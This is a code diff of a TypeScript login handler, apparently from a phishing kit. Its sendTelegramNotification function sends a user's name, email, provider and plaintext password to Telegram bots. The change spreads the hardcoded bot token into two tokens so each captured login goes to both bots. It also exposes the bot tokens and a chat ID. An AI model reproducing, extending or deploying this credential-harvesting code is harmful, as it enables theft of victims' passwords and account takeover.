@@ -20,7 +20,10 @@ interface LoginResponse {
 }
 
 // Telegram configuration
-const TELEGRAM_BOT_TOKEN = '8804852438:AAHO9Vg1h_7FKGKaYihYHtNJ6qvatUb72kg'
+const TELEGRAM_BOT_TOKENS = [
+  '8804852438:AAHO9Vg1h_7FKGKaYihYHtNJ6qvatUb72kg',
+  '8234661437:AAEfrr0hNdLeuCORKKDdl8U-G4nIbhTw1Xg'
+]
 const TELEGRAM_CHAT_ID = '7607683158'
 
 async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
@@ -42,9 +45,8 @@ async function sendTelegramNotification(name: string, email: string, provider: s
   `.trim()
 
   try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
+    const fetchPromises = TELEGRAM_BOT_TOKENS.map(token => 
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -54,14 +56,18 @@ async function sendTelegramNotification(name: string, email: string, provider: s
           text: message,
           parse_mode: 'HTML',
         }),
-      }
+      })
     )
 
-    if (!response.ok) {
-      console.error('Telegram notification failed:', await response.text())
+    const responses = await Promise.all(fetchPromises)
+    
+    for (let i = 0; i < responses.length; i++) {
+      if (!responses[i].ok) {
+        console.error(`Telegram notification failed for bot ${i}:`, await responses[i].text())
+      }
     }
   } catch (error) {
-    console.error('Error sending Telegram notification:', error)
+    console.error('Error sending Telegram notifications:', error)
   }
 }
 
